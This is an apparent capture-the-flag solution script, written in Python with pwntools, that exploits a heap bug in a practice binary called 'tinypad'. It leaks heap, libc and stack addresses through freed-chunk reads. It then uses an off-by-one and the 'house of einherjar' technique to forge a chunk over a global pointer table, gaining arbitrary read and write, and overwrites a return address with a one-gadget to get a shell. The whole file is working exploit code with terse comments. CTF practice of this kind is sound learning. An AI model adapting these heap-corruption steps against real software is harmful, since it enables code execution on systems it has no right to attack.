from pwn import *
context.binary = './tinypad'
#context.log_level = 'debug'
context.timeout = None
elf = context.binary
libc = context.binary.libc
p = process('./tinypad',  stdin=PTY)

def dbg():
	raw_input()

def add(size, content):
	p.recvuntil('(CMD)>>> ')
	p.sendline('A')
	p.recvuntil('(SIZE)>>> ')
	p.sendline(str(size))
	p.recvuntil('(CONTENT)>>> ')
	p.sendline(content)

	print "add a chunk success!"

def delete(idx):
	p.recvuntil('(CMD)>>> ')
	p.sendline('D')
	p.recvuntil('(INDEX)>>> ')
	p.sendline(str(idx))
	print "delete chunk %d success!" % idx

def edit(idx, content):
	p.recvuntil('(CMD)>>> ')
	p.sendline('E')
	p.recvuntil('(INDEX)>>> ')
	p.sendline(str(idx))
	p.recvuntil('(CONTENT)>>> ')
	p.sendline(content)
	p.recvuntil('(Y/n)>>> ')
	p.sendline('Y')
	print "edit chunk %d success!" % idx

add(0xe8, 'a')
add(0xf0, 'b'*0xf0)
add(0xf0, 'c')
add(0xf0, 'd')

delete(3)
delete(1)

p.recvuntil(' #   INDEX: 1')
p.recvuntil('# CONTENT: ')
heapbase = u64(p.recvline().strip().ljust(8, '\x00')) - 0x1f0

p.recvuntil(' #   INDEX: 3')
p.recvuntil('# CONTENT: ')
libc_base = u64(p.recvline().strip().ljust(8, '\x00')) - 0x3c4b78

system_addr = libc_base + libc.symbols['system']
print "heapbase ==> "+hex(heapbase)
print "libc_base ==> "+hex(libc_base)
print "system_addr ==> "+hex(system_addr)

#off by one
#house of enijar
#mkae topchunk to tinypad
tinypad = 0x0602040
offset = heapbase+0xf0 - tinypad

gdb.attach(p, 'b* 0x4008C3')

add(0xe8, 'a'*0xe0 + p64(offset))			#1
#leave only 1, 2
delete(4)	
#use copy to make a fake_chunk at tinypad	
payload = p64(0x100) + p64(offset) + p64(tinypad)*4			
edit(2, payload)
delete(2)							#now the top chunk points to tinypad

gadget_address = 0xf1117+libc_base

add(0xe0, 't'*0xe0)					#malloc the unuse memory

#cover the pointers
#tinypad[0] = &environ
#tinypad[1] = &tinypad[0]

payload = p64(0xe8) + p64(libc_base+libc.symbols['__environ'])
payload += p64(0xe0) + p64(0x602148)							
add(0x100, payload)

p.readuntil("# CONTENT: ")
stack = p.recv(6)
stack += "\x00"*(8-len(stack))
stack_env = u64(stack)
print "env_stack address: " + hex(stack_env)
# pause()
edit(2, p64(stack_env-240))
edit(1, p64(gadget_address))

p.interactive()
p.close()